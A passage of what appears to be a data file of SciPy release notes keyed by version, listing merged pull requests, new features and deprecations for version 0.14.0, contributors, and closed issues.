transform tests\n* `10670 <https://github.com/scipy/scipy/pull/10670>`__: DOC: Clarify docs and error messages for scipy.signal.butter\n* `10672 <https://github.com/scipy/scipy/pull/10672>`__: ENH: return solution attribute when using events in solve_ivp\n* `10675 <https://github.com/scipy/scipy/pull/10675>`__: MAINT: special: add an explicit NaN check for \\`iv\\` arguments\n* `10679 <https://github.com/scipy/scipy/pull/10679>`__: DOC: special: Add documentation for \\`beta\\` function\n* `10681 <https://github.com/scipy/scipy/pull/10681>`__: TST: sparse.linalg: fix arnoldi test seed\n* `10682 <https://github.com/scipy/scipy/pull/10682>`__: DOC: special: Add documentation for \\`betainc\\` function\n* `10684 <https://github.com/scipy/scipy/pull/10684>`__: TST: special: require Mpmath 1.1.0 for \\`test_hyperu_around_0\\`\n* `10686 <https://github.com/scipy/scipy/pull/10686>`__: FIX: sphinx isattributedescriptor is not available in sphinx...\n* `10687 <https://github.com/scipy/scipy/pull/10687>`__: DOC: added Docker quickstart guide by andyfaff\n* `10689 <https://github.com/scipy/scipy/pull/10689>`__: DOC: special: clarify format of parameters/returns sections for...\n* `10690 <https://github.com/scipy/scipy/pull/10690>`__: DOC: special: improve docstrings of incomplete gamma functions\n* `10692 <https://github.com/scipy/scipy/pull/10692>`__: ENH: higher-dimensional input in \\`spatial.SphericalVoronoi\\`\n* `10694 <https://github.com/scipy/scipy/pull/10694>`__: ENH: ScalarFunction.fun_and_grad\n* `10698 <https://github.com/scipy/scipy/pull/10698>`__: DOC: special: Add documentation for \\`betaincinv\\`\n* `10699 <https://github.com/scipy/scipy/pull/10699>`__: MAINT: remove time print lbfgsb fixes #8417\n* `10701 <https://github.com/scipy/scipy/pull/10701>`__: TST, MAINT: bump OpenBLAS to 0.3.7 stable\n* `10702 <https://github.com/scipy/scipy/pull/10702>`__: DOC: clarify iterations consume multiple function calls\n* `10703 <https://github.com/scipy/scipy/pull/10703>`__: DOC: iprint doc lbfgsb closes #5482\n* `10708 <https://github.com/scipy/scipy/pull/10708>`__: TST: test suggested in gh1758\n* `10710 <https://github.com/scipy/scipy/pull/10710>`__: ENH: Added nan_policy to circ functions in \\`stats\\`\n* `10712 <https://github.com/scipy/scipy/pull/10712>`__: ENH: add axis parameter to stats.entropy\n* `10714 <https://github.com/scipy/scipy/pull/10714>`__: DOC: Formatting fix rv_continuous.expect docs\n* `10715 <https://github.com/scipy/scipy/pull/10715>`__: DOC: BLD: update doc Makefile for python version; add scipy version...\n* `10717 <https://github.com/scipy/scipy/pull/10717>`__: MAINT: modernize doc/Makefile\n* `10719 <https://github.com/scipy/scipy/pull/10719>`__: Enable setting minres initial vector\n* `10720 <https://github.com/scipy/scipy/pull/10720>`__: DOC: silence random warning in doc build for \\`stats.binned_statistic_dd\\`\n* `10724 <https://github.com/scipy/scipy/pull/10724>`__: DEV: Add doc option to runtests.py\n* `10728 <https://github.com/scipy/scipy/pull/10728>`__: MAINT: get rid of gramA, gramB text files that lobpcg tests leave...\n* `10732 <https://github.com/scipy/scipy/pull/10732>`__: DOC: add min_only to docstring for Dijkstra's algorithm\n* `10734 <https://github.com/scipy/scipy/pull/10734>`__: DOC: spell out difference between source and target in shortest...\n* `10735 <https://github.com/scipy/scipy/pull/10735>`__: Fix for Python 4\n* `10739 <https://github.com/scipy/scipy/pull/10739>`__: BUG: optimize/slsqp: deal with singular BFGS update\n* `10741 <https://github.com/scipy/scipy/pull/10741>`__: ENH: LAPACK wrappers for ?geequ, ?geequb, ?syequb, ?heequb\n* `10742 <https://github.com/scipy/scipy/pull/10742>`__: DOC: special: add to the docstring of \\`gammaln\\`\n* `10743 <https://github.com/scipy/scipy/pull/10743>`__: ENH: special: add a real dispatch for \\`wrightomega\\`\n* `10746 <https://github.com/scipy/scipy/pull/10746>`__: MAINT: Fix typos in comments, docs and test name\n* `10747 <https://github.com/scipy/scipy/pull/10747>`__: Remove spurious quotes\n* `10750 <https://github.com/scipy/scipy/pull/10750>`__: MAINT: make cython code more precise\n* `10751 <https://github.com/scipy/scipy/pull/10751>`__: MAINT: Check that scipy.linalg.lapack functions are documented\n* `10752 <https://github.com/scipy/scipy/pull/10752>`__: MAINT: special: use \\`sf_error\\` in Cephes\n* `10755 <https://github.com/scipy/scipy/pull/10755>`__: DOC: cluster: Add 'See Also' and 'Examples' for kmeans2.\n* `10763 <https://github.com/scipy/scipy/pull/10763>`__: MAINT: list of minimize methods\n* `10768 <https://github.com/scipy/scipy/pull/10768>`__: BUG: Fix corner case for sos2zpk\n* `10773 <https://github.com/scipy/scipy/pull/10773>`__: Fix error type for complex input to scipy.fftpack.rfft and irfft\n* `10776 <https://github.com/scipy/scipy/pull/10776>`__: ENH: handle geodesic input in \\`spatial.SphericalVoronoi\\`\n* `10777 <https://github.com/scipy/scipy/pull/10777>`__: MAINT: minimizer-->custom should handle the kinds of bounds/constrain\u2026...\n* `10781 <https://github.com/scipy/scipy/pull/10781>`__: ENH: solve_triangular C order improvement\n* `10787 <https://github.com/scipy/scipy/pull/10787>`__: Fix behavior of \\`exp1\\` on branch cut and add docstring\n* `10789 <https://github.com/scipy/scipy/pull/10789>`__: DOC: special: add parameters/returns doc sections for erfc/erfcx/erfi\n* `10790 <https://github.com/scipy/scipy/pull/10790>`__: Travis CI: sudo is deprecated and Xenial is default distro\n* `10792 <https://github.com/scipy/scipy/pull/10792>`__: DOC: special: add full docstring for \\`expi\\`\n* `10799 <https://github.com/scipy/scipy/pull/10799>`__: DOC: special: add a complete docstring for \\`expn\\`\n* `10800 <https://github.com/scipy/scipy/pull/10800>`__: Docs edits (GSoD)\n* `10802 <https://github.com/scipy/scipy/pull/10802>`__: BUG: fix UnboundLocalError in Radau (scipy#10775)\n* `10804 <https://github.com/scipy/scipy/pull/10804>`__: ENH: Speed up next_fast_len with LRU cache\n* `10805 <https://github.com/scipy/scipy/pull/10805>`__: DOC: Fix unbalanced quotes in signal.place_poles\n* `10809 <https://github.com/scipy/scipy/pull/10809>`__: ENH: Speed up next_fast_len\n* `10810 <https://github.com/scipy/scipy/pull/10810>`__: ENH: Raise catchable exceptions for bad Fortran files\n* `10811 <https://github.com/scipy/scipy/pull/10811>`__: MAINT: optimize: Remove extra variable from _remove_redundancy_dense\n* `10813 <https://github.com/scipy/scipy/pull/10813>`__: MAINT: special: Remove unused variables from _kolmogi and _smirnovi\n* `10815 <https://github.com/scipy/scipy/pull/10815>`__: DOC, API: scipy.stats.reciprocal is \"log-uniform\"\n* `10816 <https://github.com/scipy/scipy/pull/10816>`__: MAINT: special: remove deprecated \\`bessel_diff_formula\\`\n* `10817 <https://github.com/scipy/scipy/pull/10817>`__: DOC: special: complete the docstring for \\`fresnel\\`\n* `10820 <https://github.com/scipy/scipy/pull/10820>`__: Fixed compiler_helper.py to allow compilation with ICC on Linux\n* `10823 <https://github.com/scipy/scipy/pull/10823>`__: DOC: updated reference guide text for consistency in writing...\n* `10825 <https://github.com/scipy/scipy/pull/10825>`__: MAINT: special: change some features of the Voigt function\n* `10828 <https://github.com/scipy/scipy/pull/10828>`__: MAINT: integrate: Remove unused variable from init_callback\n* `10830 <https://github.com/scipy/scipy/pull/10830>`__: Adding LOBPCG solver in svds in addition to ARPACK\n* `10837 <https://github.com/scipy/scipy/pull/10837>`__: WIP: ENH: reduction function for \\`spatial.tranform.Rotation\\`...\n* `10843 <https://github.com/scipy/scipy/pull/10843>`__: ENH: Adding optional parameter to stats.zscores to allow for...\n* `10845 <https://github.com/scipy/scipy/pull/10845>`__: Rebase kruskal fix\n* `10847 <https://github.com/scipy/scipy/pull/10847>`__: remove redundant __getitem__ from scipy.sparse.lil\n* `10848 <https://github.com/scipy/scipy/pull/10848>`__: Better handling of empty (not missing) docstrings\n* `10849 <https://github.com/scipy/scipy/pull/10849>`__: ENH: implement rmatmat for LinearOperator\n* `10850 <https://github.com/scipy/scipy/pull/10850>`__: MAINT : Refactoring lil List of Lists\n* `10851 <https://github.com/scipy/scipy/pull/10851>`__: DOC: add a generative art example to the scipy.spatial tutorial.\n* `10852 <https://github.com/scipy/scipy/pull/10852>`__: DOC: linalg: fixed gh-10838 unused imports in example deleted\n* `10854 <https://github.com/scipy/scipy/pull/10854>`__: DOC: special: add a full docstring for \\`pdtr\\`\n* `10861 <https://github.com/scipy/scipy/pull/10861>`__: ENH: option to reuse binnumbers in stats.binned_statistic_dd\n* `10863 <https://github.com/scipy/scipy/pull/10863>`__: DOC: partial standardization and validation of scipy.stats reference...\n* `10865 <https://github.com/scipy/scipy/pull/10865>`__: BUG: special: fix incomplete gamma functions for infinite \\`a\\`\n* `10866 <https://github.com/scipy/scipy/pull/10866>`__: ENH: calculation of mean in spatial.transform.Rotation\n* `10867 <https://github.com/scipy/scipy/pull/10867>`__: MAINT: Also store latex directory\n* `10869 <https://github.com/scipy/scipy/pull/10869>`__: ENH: Implement overlap-add convolution\n* `10870 <https://github.com/scipy/scipy/pull/10870>`__: ENH: Do not raise EOF error if wavfile data read\n* `10876 <https://github.com/scipy/scipy/pull/10876>`__: ENH: Add beta-binomial distribution to scipy.stats\n* `10878 <https://github.com/scipy/scipy/pull/10878>`__: MAINT: Update R project URL\n* `10883 <https://github.com/scipy/scipy/pull/10883>`__: MAINT: (ndimage) More robust check for output being a numpy dtype\n* `10884 <https://github.com/scipy/scipy/pull/10884>`__: DOC: Added instructions on adding a new distribution to scipy.stats.\n* `10885 <https://github.com/scipy/scipy/pull/10885>`__: [BUG] fix lobpcg with maxiter=None results in Exception\n* `10899 <https://github.com/scipy/scipy/pull/10899>`__: ENH: Match R functionality for hmean\n* `10900 <https://github.com/scipy/scipy/pull/10900>`__: MAINT: stats: Use keepdims to simplify a few lines in power_divergence.\n* `10901 <https://github.com/scipy/scipy/pull/10901>`__: ENH: sparse/linalg: support pydata/sparse matrices\n* `10907 <https://github.com/scipy/scipy/pull/10907>`__: Check whether \\`maxiter\\` is integer\n* `10912 <https://github.com/scipy/scipy/pull/10912>`__: ENH: warn user that quad() ignores \\`points=...\\` when \\`weight=...\\`...\n* `10918 <https://github.com/scipy/scipy/pull/10918>`__: CI: fix Travis CI py3.8 build\n* `10920 <https://github.com/scipy/scipy/pull/10920>`__: MAINT: Update constants to codata 2018 values (second try)\n* `10921 <https://github.com/scipy/scipy/pull/10921>`__: ENH: scipy.sparse.lil: tocsr accelerated\n* `10924 <https://github.com/scipy/scipy/pull/10924>`__: BUG: Forbid passing 'args' as kwarg in scipy.optimize.curve_fit\n* `10928 <https://github.com/scipy/scipy/pull/10928>`__: DOC: Add examples to io.wavfile docstrings\n* `10934 <https://github.com/scipy/scipy/pull/10934>`__: typo fix\n* `10935 <https://github.com/scipy/scipy/pull/10935>`__: BUG: Avoid undefined behaviour on float to unsigned conversion\n* `10936 <https://github.com/scipy/scipy/pull/10936>`__: DOC: Added missing example to stats.mstats.variation\n* `10939 <https://github.com/scipy/scipy/pull/10939>`__: ENH: scipy.sparse.lil: tocsr accelerated depending on density\n* `10946 <https://github.com/scipy/scipy/pull/10946>`__: BUG: setting verbose > 2 in minimize with trust-constr method...\n* `10947 <https://github.com/scipy/scipy/pull/10947>`__: DOC: special: small improvements to the \\`poch\\` docstring\n* `10949 <https://github.com/scipy/scipy/pull/10949>`__: BUG: fix return type of erlang_gen._argcheck\n* `10951 <https://github.com/scipy/scipy/pull/10951>`__: DOC: fixed Ricker wavelet formula\n* `10954 <https://github.com/scipy/scipy/pull/10954>`__: BUG: special: fix \\`factorial\\` return type for 0-d inputs\n* `10955 <https://github.com/scipy/scipy/pull/10955>`__: MAINT: Relax the assert_unitary atol value\n* `10956 <https://github.com/scipy/scipy/pull/10956>`__: WIP: make pdtr(int, double) be pdtr(double, double)\n* `10957 <https://github.com/scipy/scipy/pull/10957>`__: BUG: Ensure full binary compatibility of long double test data\n* `10964 <https://github.com/scipy/scipy/pull/10964>`__: ENH: Make Slerp callable with a scalar argument\n* `10972 <https://github.com/scipy/scipy/pull/10972>`__: BUG: Handle complex gains in zpk2sos\n* `10975 <https://github.com/scipy/scipy/pull/10975>`__: TST: skip test_kendalltau ppc64le\n* `10978 <https://github.com/scipy/scipy/pull/10978>`__: BUG: boxcox data dimension and constancy check #5112\n* `10979 <https://github.com/scipy/scipy/pull/10979>`__: API: Rename dcm to (rotation) matrix in Rotation class\n* `10981 <https://github.com/scipy/scipy/pull/10981>`__: MAINT: add support for a==0 and x>0 edge case to igam and igamc\n* `10986 <https://github.com/scipy/scipy/pull/10986>`__: MAINT: Remove direct imports from numpy in signaltools.py\n* `10988 <https://github.com/scipy/scipy/pull/10988>`__: BUG: signal: fixed issue #10360\n* `10989 <https://github.com/scipy/scipy/pull/10989>`__: FIX binned_statistic_dd Mac wheel test fails\n* `10990 <https://github.com/scipy/scipy/pull/10990>`__: BUG: Fix memory leak in shgo triangulation\n* `10992 <https://github.com/scipy/scipy/pull/10992>`__: TST: Relax tolerance in upfirdn test_modes\n* `10993 <https://github.com/scipy/scipy/pull/10993>`__: TST: bump tolerance in optimize tests\n* `10997 <https://github.com/scipy/scipy/pull/10997>`__: MAINT: Rework residue and residuez\n* `11001 <https://github.com/scipy/scipy/pull/11001>`__: DOC: Updated Windows build tutorial\n* `11004 <https://github.com/scipy/scipy/pull/11004>`__: BUG: integrate/quad_vec: fix several bugs in quad_vec\n* `11005 <https://github.com/scipy/scipy/pull/11005>`__: TST: add Python 3.8 Win CI\n* `11006 <https://github.com/scipy/scipy/pull/11006>`__: DOC: special: add a reference for \\`kl_div\\`\n* `11012 <https://github.com/scipy/scipy/pull/11012>`__: MAINT: Rework invres and invresz\n* `11015 <https://github.com/scipy/scipy/pull/11015>`__: DOC: special: add references for \\`rel_entr\\`\n* `11017 <https://github.com/scipy/scipy/pull/11017>`__: DOC: numpydoc validation of morestats.py\n* `11018 <https://github.com/scipy/scipy/pull/11018>`__: MAINT: Filter unrelated warning\n* `11031 <https://github.com/scipy/scipy/pull/11031>`__: MAINT: update choose_conv_method for pocketfft implementation\n* `11034 <https://github.com/scipy/scipy/pull/11034>`__: MAINT: TST: Skip tests with multiprocessing that use \"spawn\"...\n* `11036 <https://github.com/scipy/scipy/pull/11036>`__: DOC: update doc/README with some more useful content.\n* `11037 <https://github.com/scipy/scipy/pull/11037>`__: DOC: special: add a complete docstring for \\`rgamma\\`\n* `11038 <https://github.com/scipy/scipy/pull/11038>`__: DOC: special: add a reference for the polygamma function\n* `11042 <https://github.com/scipy/scipy/pull/11042>`__: TST: fix tf2zpk test failure due to incorrect complex sorting.\n* `11044 <https://github.com/scipy/scipy/pull/11044>`__: MAINT: choose_conv_method can choose fftconvolution for longcomplex\n* `11046 <https://github.com/scipy/scipy/pull/11046>`__: TST: Reduce tolerance for ppc64le with reference lapack\n* `11048 <https://github.com/scipy/scipy/pull/11048>`__: DOC: special: add reference for orthogonal polynomial functions\n* `11049 <https://github.com/scipy/scipy/pull/11049>`__: MAINT: proper random number initialization and readability fix\n* `11051 <https://github.com/scipy/scipy/pull/11051>`__: MAINT: pep8 cleanup\n* `11054 <https://github.com/scipy/scipy/pull/11054>`__: TST: bump test precision for dual_annealing SLSQP test\n* `11055 <https://github.com/scipy/scipy/pull/11055>`__: DOC: special: add a reference for \\`zeta\\`\n* `11056 <https://github.com/scipy/scipy/pull/11056>`__: API: Deprecated normalized keyword in Rotation\n* `11065 <https://github.com/scipy/scipy/pull/11065>`__: DOC: Ubuntu Development Environment Quickstart should not modify...\n* `11066 <https://github.com/scipy/scipy/pull/11066>`__: BUG: skip deprecation for numpy top-level types\n* `11067 <https://github.com/scipy/scipy/pull/11067>`__: DOC: updated documentation for consistency in writing style\n* `11070 <https://github.com/scipy/scipy/pull/11070>`__: DOC: Amendment to Ubuntu Development Environment Quickstart should...\n* `11073 <https://github.com/scipy/scipy/pull/11073>`__: DOC: fix 1.4.0 release notes\n* `11081 <https://github.com/scipy/scipy/pull/11081>`__: API: Replace Rotation.match_vectors with align_vectors\n* `11083 <https://github.com/scipy/scipy/pull/11083>`__: DOC: more 1.4.0 release note fixes\n* `11092 <https://github.com/scipy/scipy/pull/11092>`__: BUG: stats: fix freezing of some distributions\n* `11096 <https://github.com/scipy/scipy/pull/11096>`__: BUG: scipy.sparse.csgraph: fixed issue #10774\n* `11124 <https://github.com/scipy/scipy/pull/11124>`__: fix Cython warnings related to _stats.pyx\n* `11126 <https://github.com/scipy/scipy/pull/11126>`__: BUG: interpolate/fitpack: fix memory leak in splprep\n* `11127 <https://github.com/scipy/scipy/pull/11127>`__: Avoid potential segfault in CSR and CSC matrix indexing\n* `11152 <https://github.com/scipy/scipy/pull/11152>`__: BUG: Fix random state bug multiscale_graphcorr\n* `11166 <https://github.com/scipy/scipy/pull/11166>`__: BUG: empty sparse slice shapes\n* `11167 <https://github.com/scipy/scipy/pull/11167>`__: BUG: redundant fft in signal.resample\n* `11181 <https://github.com/scipy/scipy/pull/11181>`__: TST: Fix tolerance of tests for aarch64\n* `11182 <https://github.com/scipy/scipy/pull/11182>`__: TST: Bump up tolerance for test_maxiter_worsening\n* `11199 <https://github.com/scipy/scipy/pull/11199>`__: BUG: sparse.linalg: mistake in unsymm. real shift-invert ARPACK eigenvalue selection\n\n\n==========================\n", "1.11.1": "------------------------\n\n* `18741 <https://github.com/scipy/scipy/pull/18741>`__: BUG: Fix work array construction for various weight shapes.\n* `18747 <https://github.com/scipy/scipy/pull/18747>`__: REL, MAINT: prep for 1.11.1\n* `18754 <https://github.com/scipy/scipy/pull/18754>`__: BUG: fix handling for \\`factorial(..., exact=False)\\` for 0-dim...\n* `18762 <https://github.com/scipy/scipy/pull/18762>`__: FIX:linalg.lu:Guard against permute_l out of bound behavior\n* `18763 <https://github.com/scipy/scipy/pull/18763>`__: MAINT:linalg.det:Return scalars for singleton inputs\n* `18778 <https://github.com/scipy/scipy/pull/18778>`__: MAINT: fix unuran licensing\n\n\n==========================\n", "1.7.2": "-----------------------\n\n* `14207 <https://github.com/scipy/scipy/pull/14207>`__: DOC: stats: remove 'Methods' section from \\`binomtest\\` docstring...\n* `14316 <https://github.com/scipy/scipy/pull/14316>`__: MAINT: Update \\`openblas_support.py\\` to support Apple Silicon\n* `14323 <https://github.com/scipy/scipy/pull/14323>`__: BUG: Speed up sparse compressed indexing with very many rows\n* `14333 <https://github.com/scipy/scipy/pull/14333>`__: MAINT: Use /usr/bin/linux32 so that sysconfig.get_platform()...\n* `14478 <https://github.com/scipy/scipy/pull/14478>`__: BUG: geometric_slerp t ndim guard\n* `14605 <https://github.com/scipy/scipy/pull/14605>`__: MAINT: Skip some interpolative decomposition tests\n* `14616 <https://github.com/scipy/scipy/pull/14616>`__: REL: update build dependency versions in pyproject.toml for 1.7.2\n* `14618 <https://github.com/scipy/scipy/pull/14618>`__: FIX: raise RuntimeWarning when Boost evaluation_error is encountered\n* `14672 <https://github.com/scipy/scipy/pull/14672>`__: BLD: add \\`zip_safe=False\\` to the \\`setup()\\` call\n* `14791 <https://github.com/scipy/scipy/pull/14791>`__: MAINT: SciPy 1.7.2 prep/backports\n* `14803 <https://github.com/scipy/scipy/pull/14803>`__: MAINT: disable include/source coverage warning.\n* `14813 <https://github.com/scipy/scipy/pull/14813>`__: Added missing np.import_array()\n* `14831 <https://github.com/scipy/scipy/pull/14831>`__: CI: Add stdlib to LD_LIBRARY_PATH\n* `14893 <https://github.com/scipy/scipy/pull/14893>`__: BUG: Fix alignment errors due to relaxed stride checking\n* `14897 <https://github.com/scipy/scipy/pull/14897>`__: BUG: avoid mutating inputs in multivariate distributions\n* `14921 <https://github.com/scipy/scipy/pull/14921>`__: MAINT: \"backport\" 3.10 support\n* `14937 <https://github.com/scipy/scipy/pull/14937>`__: MAINT: backports for 1.7.2, plus update Pythran min version to...\n* `14938 <https://github.com/scipy/scipy/pull/14938>`__: TST: silence test failures on macOS for \\`beta.ppf\\` overflow\n\n\n==========================\n", "0.14.0": "many new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  There have been a number of deprecations and\nAPI changes in this release, which are documented below.  All users\nare encouraged to upgrade to this release, as there are a large number\nof bug-fixes and optimizations.  Moreover, our development attention\nwill now shift to bug-fix releases on the 0.14.x branch, and on adding\nnew features on the master branch.\n\nThis release requires Python 2.6, 2.7 or 3.2-3.4 and NumPy 1.5.1 or greater.\n\n\nNew features\n============\n\n``scipy.interpolate`` improvements\n----------------------------------\n\nA new wrapper function `scipy.interpolate.interpn` for interpolation on regular\ngrids has been added. `interpn` supports linear and nearest-neighbor\ninterpolation in arbitrary dimensions and spline interpolation in two\ndimensions.\n\nFaster implementations of piecewise polynomials in power and Bernstein\npolynomial bases have been added as `scipy.interpolate.PPoly` and\n`scipy.interpolate.BPoly`. New users should use these in favor of\n`scipy.interpolate.PiecewisePolynomial`.\n\n`scipy.interpolate.interp1d` now accepts non-monotonic inputs and sorts them.\nIf performance is critical, sorting can be turned off by using the new\n``assume_sorted`` keyword.\n\nFunctionality for evaluation of bivariate spline derivatives in\n``scipy.interpolate`` has been added.\n\nThe new class `scipy.interpolate.Akima1DInterpolator` implements the piecewise\ncubic polynomial interpolation scheme devised by H. Akima.\n\nFunctionality for fast interpolation on regular, unevenly spaced grids\nin arbitrary dimensions has been added as\n`scipy.interpolate.RegularGridInterpolator` .\n\n\n``scipy.linalg`` improvements\n-----------------------------\n\nThe new function `scipy.linalg.dft` computes the matrix of the\ndiscrete Fourier transform.\n\nA condition number estimation function for matrix exponential,\n`scipy.linalg.expm_cond`, has been added.\n\n\n``scipy.optimize`` improvements\n-------------------------------\n\nA set of benchmarks for optimize, which can be run with ``optimize.bench()``,\nhas been added.\n\n`scipy.optimize.curve_fit` now has more controllable error estimation via the\n``absolute_sigma`` keyword.\n\nSupport for passing custom minimization methods to ``optimize.minimize()``\nand ``optimize.minimize_scalar()`` has been added, currently useful especially\nfor combining ``optimize.basinhopping()`` with custom local optimizer routines.\n\n\n``scipy.stats`` improvements\n----------------------------\n\nA new class `scipy.stats.multivariate_normal` with functionality for \nmultivariate normal random variables has been added.\n\nA lot of work on the ``scipy.stats`` distribution framework has been done.\nMoment calculations (skew and kurtosis mainly) are fixed and verified, all\nexamples are now runnable, and many small accuracy and performance improvements\nfor individual distributions were merged.\n\nThe new function `scipy.stats.anderson_ksamp` computes the k-sample\nAnderson-Darling test for the null hypothesis that k samples come from\nthe same parent population.\n\n\n``scipy.signal`` improvements\n-----------------------------\n\n``scipy.signal.iirfilter`` and related functions to design Butterworth,\nChebyshev, elliptical and Bessel IIR filters now all use pole-zero (\"zpk\")\nformat internally instead of using transformations to numerator/denominator\nformat.  The accuracy of the produced filters, especially high-order ones, is\nimproved significantly as a result.\n\nThe Savitzky-Golay filter was added with the new functions\n`scipy.signal.savgol_filter` and `scipy.signal.savgol_coeffs`.\n\nThe new function `scipy.signal.vectorstrength` computes the vector strength,\na measure of phase synchrony, of a set of events.\n\n\n``scipy.special`` improvements\n------------------------------\n\nThe functions `scipy.special.boxcox` and `scipy.special.boxcox1p`, which\ncompute the Box-Cox transformation, have been added.\n\n\n``scipy.sparse`` improvements\n-----------------------------\n\n- Significant performance improvement in CSR, CSC, and DOK indexing speed. \n- When using Numpy >= 1.9 (to be released in MM 2014), sparse matrices function\n  correctly when given to arguments of ``np.dot``, ``np.multiply`` and other\n  ufuncs.  With earlier Numpy and Scipy versions, the results of such\n  operations are undefined and usually unexpected. \n- Sparse matrices are no longer limited to ``2^31`` nonzero elements.  They\n  automatically switch to using 64-bit index data type for matrices containing\n  more elements.  User code written assuming the sparse matrices use int32 as\n  the index data type will continue to work, except for such large matrices.\n  Code dealing with larger matrices needs to accept either int32 or int64\n  indices. \n\n\nDeprecated features\n===================\n\n``anneal``\n----------\n\nThe global minimization function `scipy.optimize.anneal` is deprecated.\nAll users should use the `scipy.optimize.basinhopping` function instead.\n\n``scipy.stats``\n---------------\n\n``randwcdf`` and ``randwppf`` functions are deprecated. All users should use\ndistribution-specific ``rvs`` methods instead.\n\nProbability calculation aliases ``zprob``, ``fprob`` and ``ksprob`` are\ndeprecated. Use instead the ``sf`` methods of the corresponding distributions\nor the ``special`` functions directly.\n\n``scipy.interpolate``\n---------------------\n\n``PiecewisePolynomial`` class is deprecated.\n\n\nBackwards incompatible changes\n==============================\n\nscipy.special.lpmn\n------------------\n\n``lpmn`` no longer accepts complex-valued arguments. A new function\n``clpmn`` with uniform complex analytic behavior has been added, and\nit should be used instead.\n\nscipy.sparse.linalg\n-------------------\n\nEigenvectors in the case of generalized eigenvalue problem are normalized to\nunit vectors in 2-norm, rather than following the LAPACK normalization\nconvention.\n\nThe deprecated UMFPACK wrapper in ``scipy.sparse.linalg`` has been removed due\nto license and install issues.  If available, ``scikits.umfpack`` is still used\ntransparently in the ``spsolve`` and ``factorized`` functions.  Otherwise,\nSuperLU is used instead in these functions.\n\nscipy.stats\n-----------\n\nThe deprecated functions ``glm``, ``oneway`` and ``cmedian`` have been removed\nfrom ``scipy.stats``.\n\n``stats.scoreatpercentile`` now returns an array instead of a list of\npercentiles.\n\nscipy.interpolate\n-----------------\n\nThe API for computing derivatives of a monotone piecewise interpolation has\nchanged: if `p` is a ``PchipInterpolator`` object, `p.derivative(der)`\nreturns a callable object representing the derivative of `p`. For in-place\nderivatives use the second argument of the `__call__` method: \n`p(0.1, der=2)` evaluates the second derivative of `p` at `x=0.1`.\n\nThe method `p.derivatives` has been removed.\n\n\nOther changes\n=============\n\n\nAuthors\n=======\n\n* Marc Abramowitz +\n* Anders Bech Borchersen +\n* Vincent Arel-Bundock +\n* Petr Baudis +\n* Max Bolingbroke\n* Fran\u00e7ois Boulogne\n* Matthew Brett\n* Lars Buitinck\n* Evgeni Burovski\n* CJ Carey +\n* Thomas A Caswell +\n* Pawel Chojnacki +\n* Phillip Cloud +\n* Stefano Costa +\n* David Cournapeau\n* David Menendez Hurtado +\n* Matthieu Dartiailh +\n* Christoph Deil +\n* J\u00f6rg Dietrich +\n* endolith\n* Francisco de la Pe\u00f1a +\n* Ben FrantzDale +\n* Jim Garrison +\n* Andr\u00e9 Gaul\n* Christoph Gohlke\n* Ralf Gommers\n* Robert David Grant\n* Alex Griffing\n* Blake Griffith\n* Yaroslav Halchenko\n* Andreas Hilboll\n* Kat Huang\n* Gert-Ludwig Ingold\n* James T. Webber +\n* Dorota Jarecka +\n* Todd Jennings +\n* Thouis (Ray) Jones\n* Juan Luis Cano Rodr\u00edguez\n* ktritz +\n* Jacques Kvam +\n* Eric Larson +\n* Justin Lavoie +\n* Denis Laxalde\n* Jussi Leinonen +\n* lemonlaug +\n* Tim Leslie\n* Alain Leufroy +\n* George Lewis +\n* Max Linke +\n* Brandon Liu +\n* Benny Malengier +\n* Matthias K\u00fcmmerer +\n* Cimarron Mittelsteadt +\n* Eric Moore\n* Andrew Nelson +\n* Niklas Hamb\u00fcchen +\n* Joel Nothman +\n* Clemens Novak\n* Emanuele Olivetti +\n* Stefan Otte +\n* peb +\n* Josef Perktold\n* pjwerneck\n* poolio\n* J\u00e9r\u00f4me Roy +\n* Carl Sandrock +\n* Andrew Sczesnak +\n* Shauna +\n* Fabrice Silva\n* Daniel B. Smith\n* Patrick Snape +\n* Thomas Spura +\n* Jacob Stevenson\n* Julian Taylor\n* Tomas Tomecek\n* Richard Tsai\n* Jacob Vanderplas\n* Joris Vankerschaver +\n* Pauli Virtanen\n* Warren Weckesser\n\nA total of 80 people contributed to this release.\nPeople with a \"+\" by their names contributed a patch for the first time.\nThis list of names is automatically generated, and may not be fully complete.\n\n\nIssues closed\n-------------\n\n- `1325 <https://github.com/scipy/scipy/issues/1325>`__: add custom axis keyword to dendrogram function in scipy.cluster.hierarchy...\n- `1437 <https://github.com/scipy/scipy/issues/1437>`__: Wrong pochhammer symbol for negative integers (Trac #910)\n- `1555 <https://github.com/scipy/scipy/issues/1555>`__: scipy.io.netcdf leaks file descriptors (Trac #1028)\n- `1569 <https://github.com/scipy/scipy/issues/1569>`__: sparse matrix failed with element-wise multiplication using numpy.multiply()...\n- `1833 <https://github.com/scipy/scipy/issues/1833>`__: Sparse matrices are limited to 2^32 non-zero elements (Trac #1307)\n- `1834 <https://github.com/scipy/scipy/issues/1834>`__: scipy.linalg.eig does not normalize eigenvector if B is given...\n- `1866 <https://github.com/scipy/scipy/issues/1866>`__: stats for invgamma (Trac #1340)\n- `1886 <https://github.com/scipy/scipy/issues/1886>`__: stats.zipf floating point warnings (Trac #1361)\n- `1887 <https://github.com/scipy/scipy/issues/1887>`__: Stats continuous distributions - floating point warnings (Trac...\n- `1897 <https://github.com/scipy/scipy/issues/1897>`__: scoreatpercentile() does not handle empty list inputs (Trac #1372)\n- `1918 <https://github.com/scipy/scipy/issues/1918>`__: splint returns incorrect results (Trac #1393)\n- `1949 <https://github.com/scipy/scipy/issues/1949>`__: kurtosistest fails in mstats with type error (Trac #1424)\n- `2092 <https://github.com/scipy/scipy/issues/2092>`__: scipy.test leaves darwin27compiled_catalog, cpp and so files...\n- `2106 <https://github.com/scipy/scipy/issues/2106>`__: stats ENH: shape parameters in distribution docstrings (Trac...\n- `2123 <https://github.com/scipy/scipy/issues/2123>`__: Bad behavior of sparse matrices in a binary ufunc (Trac #1598)\n- `2152 <https://github.com/scipy/scipy/issues/2152>`__: Fix mmio/fromfile on gzip on Python 3 (Trac #1627)\n- `2164 <https://github.com/scipy/scipy/issues/2164>`__: stats.rice.pdf(x, 0) returns nan (Trac #1639)\n- `2169 <https://github.com/scipy/scipy/issues/2169>`__: scipy.optimize.fmin_bfgs not handling functions with boundaries...\n- `2177 <https://github.com/scipy/scipy/issues/2177>`__: scipy.cluster.hierarchy.ClusterNode.pre_order returns IndexError...\n- `2179 <https://github.com/scipy/scipy/issues/2179>`__: coo.todense() segfaults (Trac #1654)\n- `2185 <https://github.com/scipy/scipy/issues/2185>`__: Precision of 